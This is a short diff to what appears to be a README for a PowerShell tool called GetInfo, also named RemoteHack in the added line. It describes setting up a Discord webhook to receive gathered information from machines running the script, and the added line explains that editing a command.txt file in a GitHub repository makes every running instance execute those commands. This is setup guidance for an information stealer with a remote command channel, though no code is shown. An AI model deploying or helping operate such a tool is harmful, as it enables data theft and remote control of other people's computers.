@@ -28,3 +28,4 @@ Example:
 
 
 By following these steps, you can deploy and customize the GetInfo script for your specific use case. Ensure that the Discord webhook and the URL to `command.txt` in your duplicated GitHub repository are correctly configured in the `.ps1` file for the script to function as intended, securely transmitting gathered information to your Discord server.
+ when you edit the command.txt file from your copied repo, all running instances of the RemoteHack will execute the commands within it.
